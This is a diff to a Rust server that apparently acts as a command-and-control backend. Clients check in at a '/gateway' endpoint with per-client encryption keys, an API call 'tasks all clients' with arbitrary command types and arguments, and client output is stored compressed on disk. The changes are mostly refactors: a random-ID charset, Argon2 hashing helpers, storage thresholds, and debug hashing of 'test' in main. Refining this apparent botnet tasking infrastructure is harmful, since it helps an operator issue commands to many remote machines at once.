@@ -47,6 +47,16 @@ use flate2::Compression;
 use flate2::write::GzEncoder;
 use flate2::read::GzDecoder;
 
+use argon2::{
+    ParamsBuilder, Params,
+    password_hash::{
+        rand_core::OsRng,
+        PasswordHash, PasswordHasher, PasswordVerifier, SaltString
+    },
+    Argon2
+};
+
+
 lazy_static! {
     static ref CONNECTION_INTERVAL: Arc<RwLock<u64>> = Arc::new(RwLock::new(0));
     static ref ENABLE_FIREWALL: Arc<RwLock<bool>> = Arc::new(RwLock::new(false));
@@ -57,6 +67,8 @@ lazy_static! {
     static ref HOST: Arc<RwLock<String>> = Arc::new(RwLock::new(String::new()));
 }
 
+const CHARSET: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+
 #[derive(Debug)]
 enum GenericError {
     Mysql(Error),
@@ -65,6 +77,10 @@ enum GenericError {
     _ProgramErrored,
     _Expired
 }
+
+
+// If the submission is below 512 characters, it will be written to the DB as normal.
+// If the submission is above 512 characters, it will be written to the disk as a storage.
 
 #[post("/gateway")]
 async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
@@ -75,7 +91,6 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
     let ip: String = req.peer_addr().unwrap().ip().to_string();
 
     if req_body.len() < 16 { return resp_badrequest(); }
-
     let client_id = String::from(&req_body[0..16]);
     let encryption_key = get_encryption_key(&mut connection, &client_id).await;
     
@@ -372,7 +387,6 @@ async fn gateway(req_body: String, req: HttpRequest) -> impl Responder {
             drop(connection); return resp_badrequest();
         }
 
-        // TODO: Add else if here, move this shit down and add a check if none of the actions are correct.
     } else {
         block_client(&mut connection, &client_id, "Didn't provide a valid action.", &ip, 3155695200).await;
         drop(connection); return resp_badrequest();
@@ -389,7 +403,7 @@ async fn api_issue_load(req_body: String) -> impl Responder {
     if key_to_string(&json, "api_secret") == api_secret {
 
         let mut connection: Conn = obtain_connection().await;
-        let load_id = generate(8, "abcdef123456789");
+        let load_id = generate(8, CHARSET);
         let parsed_cmd_args = &parse_storage_write(key_to_string(&json, "cmd_args").as_bytes());
 
         let load_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
@@ -424,7 +438,7 @@ async fn api_issue_load(req_body: String) -> impl Responder {
             is_recursive_text = "Non-is_recursive";
         }
 
-        task_all_clients(&key_to_string(&json, "cmd_args"), &key_to_string(&json, "cmd_type"), &load_id).await;
+        task_all_clients(&parsed_cmd_args, &key_to_string(&json, "cmd_type"), &load_id).await;
         
         fprint("success", &format!("{} load created for command {} with these args: {}", 
             is_recursive_text.yellow(), key_to_string(&json, "cmd_type"), parsed_cmd_args.yellow()
@@ -951,7 +965,7 @@ async fn block_client(connection: &mut Conn, client_id: &str, reason: &str, ip: 
     let result = connection.exec_drop(
     r"INSERT INTO blocks (block_id, client_id, reason, ip, banned_until) VALUES (:block_id, :client_id, :reason, :ip, :banned_until)",
     params! {
-        "block_id" => generate(8, "abcdef123456"),
+        "block_id" => generate(8, CHARSET),
         "client_id" => &client_id,
         "reason" => &reason,
         "ip" => &ip,
@@ -999,7 +1013,7 @@ async fn is_client_blocked(connection: &mut Conn, client_id: &String, ip: &Strin
     }
 
     match blocked_client_query {
-        Ok(None) => false, // TODO: Add a check here to see if the IP is from a server using scamalyctics. If it is, add it to the blocklist.
+        Ok(None) => false,
         Ok(_) =>  {
             if blocked_client_query.unwrap().unwrap() < get_timestamp() {
 
@@ -1048,7 +1062,7 @@ async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {
 
     for row in selected_clients.unwrap() {       
 
-        let command_id = generate(8, "abcdef123456789");
+        let command_id = generate(8, CHARSET);
         let client_id = value_to_str(&row, 0);
 
         let command_insert_sql: std::result::Result<Vec<String>, Error> = connection.exec(  
@@ -1067,7 +1081,7 @@ async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {
                 "client_id" => &client_id,
                 "load_id" => &load_id,
                 "cmd_type" => &cmd_type,
-                "cmd_args" => parse_storage_write(cmd_args.as_bytes()),
+                "cmd_args" => &cmd_args,
                 "time_issued" => get_timestamp(),
             }
         ).await;
@@ -1084,7 +1098,7 @@ async fn task_all_clients(cmd_args: &str, cmd_type: &str, load_id: &str) -> () {
 }
 
 async fn task_client(connection: &mut Conn, client_id: &str, cmd_args: &str, cmd_type: &str) -> bool{
-    let command_id = generate(8, "abcdef123456789");
+    let command_id = generate(8, CHARSET);
     let task_client_sql_success = connection.exec_drop(  
         r"
         INSERT INTO commands (
@@ -1223,7 +1237,7 @@ async fn is_uncompleted_load(connection: &mut Conn, client_id: &String, load_id:
 }
 
 fn parse_storage_write(storage: &[u8]) -> String {
-    let storage_id = generate(16, "abcdefghijklmnopqrstuvwxyz");
+    let storage_id = generate(16, CHARSET);
 
     // Try decoding. If decoding fails, do nothing. If decoding succeeds, use that for the rest of the fn.
     let parsed_storage = match decode_block(str::from_utf8(storage).unwrap()) {
@@ -1231,7 +1245,7 @@ fn parse_storage_write(storage: &[u8]) -> String {
         Err(_) => storage.to_owned()
     };
 
-    if (&parsed_storage).len() >= 1024 {
+    if (&parsed_storage).len() >= 512 {
         let mut file = File::create(format!("artifacts/storages/{}", &storage_id)).unwrap();
         file.write_all(&compress_bytes(&parsed_storage)).unwrap();
         return format!("storage:{}", storage_id)
@@ -1248,9 +1262,9 @@ fn parse_storage_write(storage: &[u8]) -> String {
 }
 
 
-fn parse_storage_read(storage: &str) -> Vec<u8> {
-    if (&storage).starts_with("storage:") {
-        let storage_id = storage.split(":").collect::<Vec<&str>>()[1];
+fn parse_storage_read(storage_id: &str) -> Vec<u8> {
+    if (&storage_id).starts_with("storage:") {
+        let storage_id = storage_id.split(":").collect::<Vec<&str>>()[1];
         match fs::read(format!("artifacts/storages/{}", storage_id)) {
             Ok(result) => {
                 return decompress_bytes(&result);
@@ -1286,7 +1300,7 @@ async fn encrypt_string_withkey(plaintext: &str, key: &[u8]) -> std::result::Res
     let final_count = encrypter.finalize(&mut ciphertext[count..])?;
 
     ciphertext.truncate(count + final_count);
-    Ok(encode_block(&ciphertext))
+    Ok(encode_block(ciphertext.as_slice()))
 }
 
 
@@ -1386,6 +1400,26 @@ async fn ip_to_country(ip: &str) -> String {
     }
 }
 
+fn argon2_hash(input: &[u8]) -> String {
+    let salt = SaltString::generate(&mut OsRng);
+    let params = 
+        ParamsBuilder::new()
+        .m_cost(2_u32.pow(4))
+        .t_cost(16)
+        .p_cost(2)
+        .build()
+        .unwrap();
+
+    let argon2 = Argon2::new(argon2::Algorithm::Argon2id, argon2::Version::V0x13, params);
+    return argon2.hash_password(input, &salt).unwrap().to_string();    
+}
+
+fn verify_argon2(hash: String, input: &[u8]) -> bool {
+
+    return Argon2::default().verify_password(
+        input, &PasswordHash::parse(&hash, argon2::password_hash::Encoding::B64
+    ).unwrap()).is_ok();
+}
 
 // ------------------------ HTTP Responses ------------------------
 
@@ -1511,12 +1545,9 @@ async fn initialize_tables(connection_pool: Pool) {
 }
 
 
-// Odd duplication issue when submitting output. Running apis.py multiple times will make storages pop out of nowhere.
-// Need to think of a better name other than storages.
-// Need to refactor code.
-
+// Add error handling to these 2 functions.
 fn compress_bytes(input: &[u8]) -> Vec<u8>{
-    let mut compressor = GzEncoder::new(Vec::new(), Compression::default());
+    let mut compressor = GzEncoder::new(Vec::new(), Compression::best());
     compressor.write_all(&input).unwrap();
     return compressor.finish().unwrap()
 }
@@ -1614,6 +1645,10 @@ async fn main() -> std::io::Result<()> {
         "Server running! Gateway path: {}", 
         format!("http://{}/gateway", key_to_string(&parsed_json_config, "host")).yellow()
     ));
+    
+    let hash = argon2_hash("test".as_bytes());
+    fprint("info", &format!("{}", hash));
+    fprint("info", &format!("Verification Status: {} ", verify_argon2(hash, "test".as_bytes())));
 
     HttpServer::new(move || {
         App::new()
